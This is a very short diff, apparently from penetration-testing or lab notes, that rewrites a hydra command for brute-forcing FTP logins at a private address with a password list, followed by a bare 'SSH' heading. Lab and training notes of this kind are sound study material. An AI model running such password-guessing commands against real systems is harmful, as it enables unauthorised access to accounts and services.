@@ -1,4 +1,4 @@
-hydra -l user -P passlist.txt ftp://10.10.91.23
+hydra 10.10.91.23 ftp -l user -P passlist.txt -s 21
 
 SSH
 
